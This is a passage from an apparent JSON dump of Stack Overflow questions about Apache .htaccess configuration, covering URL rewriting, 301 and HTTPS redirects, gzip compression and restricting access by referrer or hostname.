$('#control2').dialog({\n        show: \"blind\",\n        hide: \"explode\",\n        width: \"auto\",\n        draggable: false,\n        modal: true,\n        resizable: false,\n        buttons: [\n                  {\n                      text: \"Save\",\n                      click: function() {\n                          $.ajax({\n                             cache: false,\n                             type: 'POST',\n                             url: 'handler/some.handler.php',\n                             data: $('#Form1').serialize(),\n                             dataType: 'json',\n                             beforeSend: function() {\n                                 $('#Control3').fadeIn('fast');\n                             },\n                             success: function (data) {\n                                 if (data.success) {\n                                     alert(data.message);\n                                     $(this).dialog(\"close\");\n                                     location.reload();\n                                 } else {\n                                     alert(\"Error occurred: \" + data.message);\n                                 }\n                             },\n                             error: function(xhr, ajaxOptions, thrownError) {\n                                 alert(\"Error during process: \" + thrownError);\n                             },\n                             complete: function () {\n                                 $('#Control3').fadeOut('fast');\n                             }\n                          });\n                      }\n                  },\n                  {\n                      text: \"Cancel\",\n                      click: function() { $(this).dialog(\"close\"); }\n                  }\n                  ]\n    });\n});\n</code></pre>\n\n<p>Inside the handler directory i placed a .htaccess file for managing file access and limit exception:</p>\n\n<pre><code>&lt;LimitExcept GET POST HEAD&gt;\n    Order deny, allow\n    Deny from all\n&lt;/LimitExcept&gt;\n</code></pre>\n\n<p>But Apache always return <strong>500: Internal sever error</strong>. If I delete the .htaccess file everything works fine... How to configure the .htaccess file correctly?</p>\n\n<p>Thx!!!</p>\n"},{"tags":["apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":19,"score":-2,"question_id":13135924,"title":"Redirecting with .htaccess","body":"<p>In my server root I have a directory called \"repos\".\nI would like request like \"server-name/repos/identifier\" to call the \"repos/index.php?id=identifier\", where identifier is something the user can chose.</p>\n\n<p>How do I accomplish this with .htaccess?</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13134011,"title":"CSS and Images not displaying after htaccess rewrite","body":"<p>I need to set-up my htaccess file so when a user inputs www.example.com/post/54 it renders as www.example.com/post.php?id=54</p>\n\n<p>I setup the rule as such:</p>\n\n<pre><code>RewriteRule ^post/(.*)$  post.php?id=$1 [L]\n</code></pre>\n\n<p>When I test it on my localhost, the page only displays it as html and does not capture the images nor the CSS file.  My directory is setup as C:/MyWebsites/example and it appears the file is loading not in the directory but in the C:/MyWebsite folder.  What would be causing this...</p>\n"},{"tags":[".htaccess","redirect","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13128603,"title":"Complex 301 .htaccess url redirection","body":"<p>I have tried several simple ways like</p>\n\n<pre><code>Redirect 301 ^/gebouw/start/(.*) http://mysub.domain.nl/start/$1\n</code></pre>\n\n<p>and some more elaborate</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} ^/gebouw/start/ [NC]\nRewriteRule ^(.*)$ http://mysub.domain.nl/start/$1 [R,L]\n</code></pre>\n\n<p>but I do not get the succes I want</p>\n\n<p>What I'm looking for is to 301 redirect every page that is browsed to from www.myolddomain.nl/start/ to mysub.domain.nl/start/\nthese url's can get complex, they range from</p>\n\n<p><a href=\"http://www.myolddomain.nl/start/resetpassword.php\" rel=\"nofollow\">http://www.myolddomain.nl/start/resetpassword.php</a></p>\n\n<p>to</p>\n\n<p><a href=\"http://www.myolddomain.nl/start/subdir/page.php?var1=inputBlad&amp;var2=6378\" rel=\"nofollow\">http://www.myolddomain.nl/start/subdir/page.php?var1=inputBlad&amp;var2=6378</a></p>\n\n<p>how can I do this best with htaccess rules?</p>\n"},{"tags":[".htaccess","redirect","http-redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13126605,"title":"Redirect non-existing subpage to another page using .htaccess","body":"<p>I would like to redirect:</p>\n\n<p>domainname.com/instalator (non existing) to domainname.com/install</p>\n\n<p>using .htaccess. How can I do this ?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13126683,"title":"Basic 301 rediret not working","body":"<p>I am trying to redirect a handful of old blog posts to new ones.  Here is my htaccess that I have written and placed in the root directory.  Keep in mind the site is now on linux server and not windows. </p>\n\n<pre><code>redirect 301 /public/recipesdetl.aspx?id=1888 http://www.mysite.com/recipes/\nredirect 301 /public/recipesdetl.aspx?id=2025 http://www.mysite.com/recipes/?p=405\nredirect 301 /public/recipesdetl.aspx?id=2682 http://www.mysite.com/recipes/?p=549\nredirect 301 /public/recipesdetl.aspx?id=2152 http://www.mysite.com/recipes/?p=309\nredirect 301 /public/recipesdetl.aspx?id=1398 http://www.mysite.com/recipes/?p=817\nredirect 301 /public/recipesdetl.aspx?id=1908 http://www.mysite.com/recipes/?p=155\nredirect 301 /public/recipesdetl.aspx?id=2162 http://www.mysite.com/recipes/?p=317\nredirect 301 /public/recipesdetl.aspx?id=1889 http://www.mysite.com/recipes/?p=145\nredirect 301 /public/recipesdetl.aspx?id=1951 http://www.mysite.com/recipes/?p=808\nredirect 301 /public/recipesdetl.aspx?id=2032 http://www.mysite.com/recipes/?p=238\nredirect 301 /public/recipesdetl.aspx?id=2101 http://www.mysite.com/recipes/?p=269\nredirect 301 /public/recipesdetl.aspx?id=2147 http://www.mysite.com/recipes/?p=304\nredirect 301 /public/recipesdetl.aspx?id=2563 http://www.mysite.com/recipes/?p=449\nredirect 301 /public/recipesdetl.aspx?id=2043 http://www.mysite.com/recipes/?p=243\nredirect 301 /public/recipesdetl.aspx?id=2224 http://www.mysite.com/recipes/?p=361\nredirect 301 /public/recipesdetl.aspx?id=2151 http://www.mysite.com/recipes/?p=308\n</code></pre>\n"},{"tags":["regex",".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":23,"score":2,"question_id":13133088,"title":"htaccess redirect regex for subfolder and files, not parent","body":"<p>I have a regular expression set up now:</p>\n\n<pre><code>^/technology/(.*)$\n</code></pre>\n\n<p>It works great for all the subfolders and files. The problem is that I don't want it to redirect when it's only the technology folder, though.</p>\n\n<pre><code>/technology/ FALSE\n/technology/something/ TRUE\n/technology/something/else/ TRUE\n</code></pre>\n\n<p>Sorry - I'm a regex newb!</p>\n"},{"tags":[".htaccess","url-rewriting","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":13056119,"title":"Using .htaccess to NOT rewrite URL's that have a certain GET Parameter","body":"<p>The following portion below is written into my .htaccess file. I'm using the ZenCart \"CEON URI Mapping\" module. I'm having a problem as there is a part of a PHP script that looks for a certain variable and displays a CSS display box when found.</p>\n\n<p>What I need to happen is for htaccess to NOT rewrite URL's with a \"amznPmtsOrderIds\" GET parameter when set. </p>\n\n<p>How would I incorporate that into the following:</p>\n\n<pre><code># BEGIN CEON URI MAPPING\n# Don't rewrite any URIs ending with a file extension (ending with .[xxxxx])\nRewriteCond %{REQUEST_URI} !\\.[a-z]{2,5}$ [NC]\n# Don't rewrite admin directory\nRewriteCond %{REQUEST_URI} !^/admin [NC]\n# Don't rewrite editors directory\nRewriteCond %{REQUEST_URI} !^/editors [NC]\n# Don't rewrite cPanel directories\nRewriteCond %{REQUEST_URI} !/cpanel [NC]\nRewriteCond %{REQUEST_URI} !/frontend [NC]\nRewriteCond %{REQUEST_URI} !\\.mp4$ [NC]\nRewriteCond %{REQUEST_URI} !/livehelp.*$ [NC]\nRewriteCond %{REQUEST_URI} !/rest.php/\nRewriteCond %{REQUEST_URI} !/restInterface\\.php.*$\n# Handle all other URIs using Zen Cart (index.php)\nRewriteRule .* index.php?%{QUERY_STRING} [L]\n# END CEON URI MAPPING\n</code></pre>\n\n<p>Thanks for the assistance.</p>\n"},{"tags":["regex","apache",".htaccess","mod-rewrite","http-redirect"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13126312,"title":"Apache redirect with parameters in URL","body":"<p>I am trying to do this in the .htaccess file, it seems simple, but every attempt I have tried so far has not worked, and I could not find an answer here.</p>\n\n<p>I would like to change <code>http://domain.com/site.php?id=2986</code>\nto <code>http://domain.com/campus_profiles/INST_ASU.php</code></p>\n\n<p>with a 301 redirect.</p>\n\n<p>What should the .htaccess entries to do this redirect look like on domain.com?</p>\n\n<p>The closest I have come so far is</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} id=2906\nRewriteRule ^site\\.php$ http://domain.com/campus_profiles/INST_ASU.php [R=301,L]\n</code></pre>\n\n<p>However, this leaves the query string on</p>\n\n<p>Nevermind.  This seems to work</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} id=2906\nRewriteRule ^site\\.php$ http://domain.com/campus_profiles/INST_ASU.php? [R=301,L]\n</code></pre>\n"},{"tags":["image",".htaccess","path","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":517,"score":0,"question_id":9700990,"title":"How to change image path using htaccess?","body":"<p>I'm fixing this joomla site. It uses joomla 1.7 language filter so it adds post fixes to the url. So when i view an artcle with images, image is not displaying.\nI tried htaccess rewrite rules. But it didn't work for me... \nthis is what i get when i copy image url.</p>\n\n<pre><code>http://domain.com/en/images/myimage.png\n</code></pre>\n\n<p>But when I check the code its <code>images/myimage.png</code> .\nIf i edit code to <code>/images/myimage.png</code> it works.</p>\n\n<p>Tthis is what i try to do with htaccess too, to add a \"/\". Since it didn't work i guess i have to change whole url. \nI don't have much knowledge in rewriting. \nCan you guys help me please?</p>\n"},{"tags":[".htaccess","http","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13131688,"title":"How to let direct traffic visit my site","body":"<p>I'm using this code in my htaccess file to only allow people that are referred from the domain of our choosing to visit our site. However, is there a way we can allow people that type in our domain, to access the site as well? (but block all other referrers?) </p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_REFERER} !^http://the-ok-domain.com [NC]\nRewriteCond %{HTTP_REFERER} !^http://your-domain.com [NC]\nRewriteRule ^ http://the-website-of-your-choosing.com/ [L,R]\n</code></pre>\n"},{"tags":["php","apache",".htaccess","permissions"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13130197,"title":"suppress apache 500 error for \"writable by others\"","body":"<p>I know it sounds crazy, but I do have a reason for doing this. I would like someone else on the same file system to be able to make changes to files, and unfortunately I can not change the group we are involved in. Is there a way to suppress this error message? I have a feeling it can achieved using some directive in a .htaccess file, but that is simply a whim and I could be completely wrong.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":13124825,"title":"Redirect from old domain to new domain without the extention","body":"<p>I have a domain whhich i want to redirect to a new domain. I want the request to stay the same but my following code is adding the .php extention to it. The following code is what i have:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^oldomain.eu [NC]\nRewriteRule ^(.*)$ http://newdomain.eu/$1 [L,R=301]\nRewriteCond %{HTTP_HOST} ^www.olddomain.eu [NC]\nRewriteRule ^(.*)$ http://newdomain.eu/$1 [L,R=301]\n</code></pre>\n\n<p>When i go to the following url: www.oldomain.eu/samplepage it is redirecting me to www.newdomain.eu/samplepage.php</p>\n\n<p>How could i prevent this from adding the .php to the url?</p>\n"},{"tags":[".htaccess","uri"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":20,"score":2,"question_id":13118121,"title":"ignore the /virtual subfolder/ that didn't exist in htaccess","body":"<p>I have a multi-language website and I want to display the current language in the URI which is something like this:</p>\n\n<p>URI:</p>\n\n<pre><code>www.domain.com/en/\nwww.domain.com/en/folder1/\nwww.domain.com/de/\nwww.domain.com/de/folder2/\n</code></pre>\n\n<p>DIRECTORY:</p>\n\n<pre><code>public_html/\npublic_html/folder1/\npublic_html/\npublic_html/folder2/\n</code></pre>\n\n<p>Then the en or de will be saved in a cookie to process the language code.\nIs it possible to do these? Even without the actual folder of the en or de?</p>\n"},{"tags":["web-services",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":147,"score":2,"question_id":12983643,"title":"htaccess allow .txt files","body":"<p>In a web folder, I currently cannot access <code>.txt</code> files via URL in browser. How can I modify my <code>htaccess</code> file, so that files with type <code>.txt</code> can be accessed via URL in browser?</p>\n"},{"tags":["regex",".htaccess","variables","redirect","folder"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":21,"score":2,"question_id":13127940,"title":"htaccess, redirect with regex: Folder to variable","body":"<p>I hope you can help me out with my little problem:</p>\n\n<p>I have an URL like so:</p>\n\n<pre><code>www.blabla.com/images/q2uj89j2fq89hf943ghf74ßgq3789fg43/blue.jpg\n</code></pre>\n\n<p>Inside the \"images\" folder i have a PHP Skript that should get everything between the string \"images/\" and the following \"/\" as a GET variable. So something like this:</p>\n\n<pre><code>www.blabla/images/script.php?param=q2uj89j2fq89hf943ghf74ßgq3789fg43\n</code></pre>\n\n<p><strong>Currently I have the following htaccess file:</strong></p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\nRewriteRule  ^(.*)$ script.php?param=$1 [QSA,L]\n</code></pre>\n\n<p>But with this I am getting something like this:</p>\n\n<pre><code>www.blabla/images/script.php?param=q2uj89j2fq89hf943ghf74ßgq3789fg43/blue.jpg\n</code></pre>\n\n<p>and obviously I only want to get everything until the next /</p>\n\n<p>Thanks in advance</p>\n"},{"tags":[".htaccess","https"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":21,"score":1,"question_id":13127448,"title":"http not redirect to https","body":"<p>How would I write the.htaccess file to <a href=\"https://www.domain.com\" rel=\"nofollow\">https://www.domain.com</a>\nexample:</p>\n\n<pre><code>domain.com =&gt; https://www.domain.com\nwww.domain.com =&gt; https://www.domain.com\nhttps://domain.com =&gt; https://www.domain.com\nhttp://www.domain.com =&gt; https://www.domain.com\n</code></pre>\n\n<p>this is my htaccess:</p>\n\n<pre><code># Use PHP5.4 Single php.ini as default\nAddHandler application/x-httpd-php54s .php\n&lt;IfModule mod_rewrite.c&gt;\n# For security reasons, Option followsymlinks cannot be overridden.\n#  Options +FollowSymLinks\n   Options +SymLinksIfOwnerMatch\n   Options +Indexes\n   RewriteEngine On\n   RewriteCond %{http_host} ^mydomain\\.com [NC]\n   RewriteRule ^(.*)$ http://www.mydomain.com/$1 [R=301,NC]\n   RewriteCond %{SCRIPT_FILENAME} !-d\n   RewriteRule ^([^\\.]+)$ $1.php [NC,L]\n   RewriteCond %{REQUEST_FILENAME}.php -f\n&lt;/IfModule&gt;\n# BEGIN WordPress\n\n# END WordPress\n</code></pre>\n\n<p>I add the next code:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n# add https to domain.\n   RewriteEngine On\nRewriteCond %{HTTPS} off\nRewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI}\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>but my domain remain www.domain.com not <a href=\"https://www.domain.com\" rel=\"nofollow\">https://www.domain.com</a> .\nwhat I should change ?</p>\n\n<p>many thanks.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":17,"score":1,"question_id":13125947,"title":"HTACCES mod rewrite, stacking rules","body":"<p>We have a rewrite rule that looks like this:</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-l\nRewriteRule (?!^(cms|images|js|mobile)(/.*|)$)^.*$ page.php [NC,L]\n</code></pre>\n\n<p>Which works as expected; if the file does not exist, forward to page.php which is a generic page and allows for pages with custom URLs.</p>\n\n<p>We also want to force the www. to precede the domain: example.com -> www.example.com</p>\n\n<p>For that, we use:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^example.com$\nRewriteRule ^(.*)$ http://www.example.com/$1 [R=301,L]\n</code></pre>\n\n<p>This also works, but when the two are supposed to work together:</p>\n\n<pre><code>example.com/non-existent-file\n</code></pre>\n\n<p>We end up getting:</p>\n\n<pre><code>www.example.bom/page.php\n</code></pre>\n\n<p>Which defaults to our 404 page. How do I modify these rules to work together? I have tried playing with some of the different suffic characters (ie. removing the L in the [NC,L] in an attempt to get both rules to process).</p>\n\n<p>I have also tried repeating the forward to page.php lines beneath the www redirect (and removing the L suffix) with no success.</p>\n\n<p>The entire HTACCESS file looks like:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteBase   /\n\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-l\nRewriteRule (?!^(cms|images|js|mobile)(/.*|)$)^.*$ page.php [NC,L]\n\nRewriteCond %{HTTP_HOST} ^example.com$\nRewriteRule ^(.*)$ http://www.example.com/$1 [R=302,L]\n</code></pre>\n\n<p>Also, is there a %{CONSTANT} I can use in place of example.com that represents the current domain?</p>\n"},{"tags":["php",".htaccess","mod-rewrite","expressionengine"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12297889,"title":"mod_rewrite - add middle tier directory","body":"<p>Pages are currently available at the following addresses:</p>\n\n<pre><code>http://www.domain.co.uk/solutions/article/page-name1\nhttp://www.domain.co.uk/solutions/article/page-name2\nhttp://www.domain.co.uk/solutions/article/page-name3\netc\n</code></pre>\n\n<p>..but I would like them to be accessible via the following addresses in order for enhanced SEO:</p>\n\n<pre><code>http://www.domain.co.uk/solutions/page-name1\nhttp://www.domain.co.uk/solutions/page-name2\nhttp://www.domain.co.uk/solutions/page-name3\n</code></pre>\n\n<p>So, I think I want to use mod_rewrite in the .htaccess file of the site root to add the 'article' directory after the solutions directory on each incoming page request. I have been looking for a suitable answer for about a month and I've tried learning the mod_rewrite basics tutorials but I just can't make this work for me so apologies for another mod_rewrite question.</p>\n\n<p>This is my .htaccess file at present:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n\n    # Removes index.php\n    RewriteCond $1 !\\.(gif|jpe?g|png)$ [NC]\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ /index.php/$1 [L]\n\n    # If 404s, \"No Input File\" or every URL returns the same thing\n    # make it /index.php?/$1 above (add the question mark)      \n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["apache",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13124802,"title":"Is it possible to trim whitespace before authenticating passwords in htaccess","body":"<p>We have a password manager which dynamically writes .htaccess files to password protect directories. We have an interface which allows us to add usernames and passwords.</p>\n\n<p>Our problem is that we send these out via email and customers like to copy &amp; paste them into the login prompt. This often leads to some whitespace being included in the username/password which causes the htaccess login to know them back. To the customer this looks like their account hasn't been set up properly as it isn't obvious (especially with the password) that they have included whitespace.</p>\n\n<p>I know it's a long shot but is there any way to get around this in the htaccess file?</p>\n"},{"tags":["php",".htaccess","maintenance-mode"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":34,"score":0,"question_id":13122477,"title":"Application visibility for superadmin during maintenance mode","body":"<p>My application is fully built now. But at times i need to bring it down for maintenance. So i created a .htaccess file and now when users try to open the application they get redirected to a different page with a maintenance image in it. The problem is after the superadmins are done with the maintenance, they need to check if the app is working fine now. But there is no way to do that as even they get navigated to the maintenance page. One of the solution is to create a testing environment. But is their any other easy solution ?</p>\n"},{"tags":["php","html","apache",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13123552,"title":".htaccess rewrite affects the url of html image source","body":"<p>I am trying to redirect a link like <code>www.mywebsite.com/phpfile/uservalue/</code> to <code>www.mywebsite.com/phpfile.php?param=uservalue</code></p>\n\n<p>So my .htaccess file is</p>\n\n<pre><code>Options -Indexes\nOptions +FollowSymLinks  \nRewriteEngine On  \nRewriteCond %{SCRIPT_FILENAME} !-d  \nRewriteCond %{SCRIPT_FILENAME} !-f  \nRewriteRule ^phpfile/(\\w*)$ ./phpfile.php?param=$1  \n</code></pre>\n\n<p>The redirect works well. Now I have a problem.\nMy phpfile.php contains the following html code among other things</p>\n\n<pre><code>&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;\n&lt;body&gt;\n&lt;img src=\"logo.png\"&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>Now if I enter <code>www.mywebsite.com/phpfile.php?param=uservalue</code> in the browser, the image loads.  But if I enter <code>www.mywebsite.com/phpfile/uservalue/</code> the image does not load.</p>\n\n<p>On inspecting the element, I found that, the php was trying to load <code>http://mywebsite.com/phpfile/logo.png</code> when the image is actually in <code>http://mywebsite.com/logo.png</code></p>\n\n<p>How do I prevent the extra 'phpfile' folder being added to the image url?</p>\n"},{"tags":["wordpress","apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":11401341,"title":".htaccess overwrites parent .htaccess","body":"<p>So I've been struggling with this for a whole day and nothing helped so far.\nI've got a PyroCMS installed in the root of the domain and a sub-domain blog in the same folder (public_html).</p>\n\n<p>Now the problem is that when visiting <a href=\"http://dev.iber.co.uk/blog/\" rel=\"nofollow\">http://dev.iber.co.uk/blog/</a> I'm seeing blog.iber.co.uk instead. Obviously that's because the blog folder exists and it's not just a url rewritten by htaccess.</p>\n\n<p>The folder structure:</p>\n\n<pre><code>public_html\n   blog\n      .htaccess\n      .index.php\n      etc..\n   .htaccess\n   index.php\n   etc..\n</code></pre>\n\n<p>However if I remove the htaccess from blog folder dev.iber.co.uk/blog/ gets rewritten to index.php as it should.</p>\n\n<p>Here's the .htaccess for the dev.iber.co.uk(this sub-domain is actually pointing at root public_html folder):</p>\n\n<pre><code>Options +FollowSymLinks -Indexes\nRewriteEngine on\nRewriteBase /\n\nRedirectMatch 403 ^/(system\\/cms\\/cache|system\\/codeigniter|\\.git|\\.hg).*$\n\nRewriteCond %{HTTP_HOST} !^blog\\.iber\\.co\\.uk [NC]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php [L]\n</code></pre>\n\n<p>Here's the .htaccess from the wordpress blog:</p>\n\n<pre><code>Options +FollowSymLinks -Indexes\nRewriteEngine on\nRewriteCond %{HTTP_HOST} ^blog\\.iber\\.co\\.uk [NC]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php [L]\n</code></pre>\n\n<p>What am I doing wrong? I have no access to rewrite log cause it's a shared server. I will give 50 rep for anyone who helps me solve it.</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","url","subdomain","rename"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":28,"score":2,"question_id":13121186,"title":"URL Rewriting after redirecting","body":"<p>I've managed to have .htaccess redirect some of my domains to subdomains. Now i'd like to change the title of the urls. Or to put it differently, change how the url appears on screen in the url input of the browser, but i just can't seem to get it to work. I must've overlooked something.</p>\n\n<p>I'd like it to be so that it won't show http://subdomain.domain.com/, but just http://www.subdomain.com/. <em>And I do own the necessary domains</em>.</p>\n\n<p>My current code:</p>\n\n<pre><code>    RewriteEngine On\n    Options +FollowSymlinks\n    RewriteCond %{HTTP_HOST} ^(www\\.)?sub1\\.com$ [NC] \n    RewriteRule ^ http://sub1.domain.com [R,L]\n    RewriteCond %{HTTP_HOST} ^(www\\.)?sub2\\.com$ [NC]\n    RewriteRule ^ http://sub2.domain.com [R,L]\n</code></pre>\n\n<p>Any suggestions?</p>\n"},{"tags":["javascript","apache",".htaccess","gzip"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":132,"score":0,"question_id":11474456,"title":".htaccess Gzip not working","body":"<p>I'm trying to compress some files to increase the speed of my site.  I'm doing this in the htaccess file and it is working for everything but a few files. </p>\n\n<p>Here is the code I'm using to compress my files:</p>\n\n<pre><code>&lt;IfModule mod_gzip.c&gt;\nmod_gzip_on       Yes\nmod_gzip_dechunk  Yes\nmod_gzip_item_include file      \\.(html?|txt|css|js|min|js?|js?1|1|css|php|pl|svg)$\nmod_gzip_item_include handler   ^cgi-script$\nmod_gzip_item_include mime      ^text/.*\nmod_gzip_item_include mime      ^text/css.*\nmod_gzip_item_include mime      ^application/javascript.*\nmod_gzip_item_include mime      ^application/.*\nmod_gzip_item_exclude mime      ^image/.*\nmod_gzip_item_exclude rspheader ^Content-Encoding:.*gzip.*\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>But these 4 files are not being compressed and I can't see why:</p>\n\n<pre><code>tryten . com/javascript/jquery.js?1 \ntryten . com/javascript/jquery/plugins/jquery-ui.min.js\ntryten . com/javascript/common.js?1 \ntryten . com/javascript/jquery/plugins/imodal/imodal.js?1\n</code></pre>\n"},{"tags":["php",".htaccess","codeigniter","permissions"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":391,"score":1,"question_id":7928947,"title":"Prevent direct access to a file, allow google doc viewer","body":"<p>I have a folder with pdf files and I want to prevent direct access but allow google doc viewer to display the file.</p>\n\n<p>I tried .htaccess, changing linux permissions and nothing worked fine (Direct access is forbidden but I get this when viewing with doc viewer: Sorry, we are unable to retrieve the document for viewing or you don't have permission to view the document)</p>\n\n<p>Anyone done this before? Thanks!</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12243606,"title":"My htaccess rewrite doesnt work","body":"<p>I have a folder structure like this</p>\n\n<pre><code>/localhost/parent/\n</code></pre>\n\n<p>I have an .htaccess residing in </p>\n\n<pre><code>/localhost/parent/\n</code></pre>\n\n<p>I want to rewrite everything from <code>/localhost/parent/WebContent/</code> to <code>/localhost/parent/</code></p>\n\n<p>here is my code</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^$ WebContent/$1\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} !^WebContent/\nRewriteRule ^(.*)$ WebContent/$1\n</code></pre>\n\n<p>For some reason the first two lines work fine, but the rest doesn't work. So I am able to redirect only homepage.</p>\n\n<h2>Update</h2>\n\n<pre><code>RewriteBase /parent/\n\nRewriteEngine on\nRewriteRule ^$ WebContent/$1\n\n#RewriteCond %{REQUEST_URI} !WebContent\nRewriteRule (.*) /parent/WebContent/$1 [R=301,L,QSA]\n</code></pre>\n\n<p>Goes into an infinite loop. I just need to avoid that loop now</p>\n"},{"tags":[".htaccess","redirect","web-hosting"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13116434,"title":"Redirect request for a directory in root of my web hosting to another directory located at the root itself","body":"<p>How can write the htaccess redirect rule for redirecting request for a directory [where a particular website is located] in root of my web hosting to another directory [different website installed in the another directory] located at the root itself.</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13115472,"title":"htaccess rule for shortening URL","body":"<p>I am trying to use rewrite rules to mask and access URL#2 using URL#1</p>\n\n<pre><code>URL#1 http://www.domain.com/user/username/send\nURL#2 http://www.domain.com/user.php?user=username&amp;action=send\n\nURL#1 http://www.domain.com/user/username/receive\nURL#2 http://www.domain.com/user.php?user=username&amp;action=receive\n</code></pre>\n\n<p>the only two variables are username and  send/receive</p>\n"},{"tags":["wordpress",".htaccess","wordpress-plugin"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":193,"score":0,"question_id":11728759,"title":"Hiding wp-login.php in wordpress","body":"<p>I am trying to hide <code>wp-login.php</code>,So that when someone do mysite/wp-login he should not be redirected to the login page.I have seen several plugins for it like <code>Lockdown WP</code> and <code>Stealth Locker</code> but that didn't worked,I googled and found that I have to make changes in the .htaccess file,but that also didn't worked out,Anyone who can tell me how to do this,If I found a plugin that would be great.\n<a href=\"http://www.phpmagicbook.com/hide-wordpress-wp-admin-login-page/\" rel=\"nofollow\">I used this link for .htaccess</a>\nThanks</p>\n"},{"tags":[".htaccess","http","ip","hostname"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13106516,"title":"Ban IP by hostname?","body":"<p>Any way to deny access to our site via the hostname an IP resolves to? </p>\n\n<p>For example:\n109.163.233.200 resolves to wau.torservers.net , and we don't want anyone access our site with a hostname that resolves to this. </p>\n\n<p>Any help is appreciated. </p>\n\n<p>Thank you!</p>\n"},{"tags":[".htaccess","redirect","ssl","https"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":21,"score":-1,"question_id":13114119,"title":"Weird redirect happening - why?","body":"<p>Since I had an ssl certificate for my domain name a weird redirect seems to be happening and I don't have a clue how to solve it. </p>\n\n<p>When I visit <a href=\"https://www.simply-pizza.com/online-ordering/printer.php\" rel=\"nofollow\">https://www.simply-pizza.com/online-ordering/printer.php</a> it redirects to <a href=\"https://www.simply-pizza.com/printer.php\" rel=\"nofollow\">https://www.simply-pizza.com/printer.php</a></p>\n\n<p>I 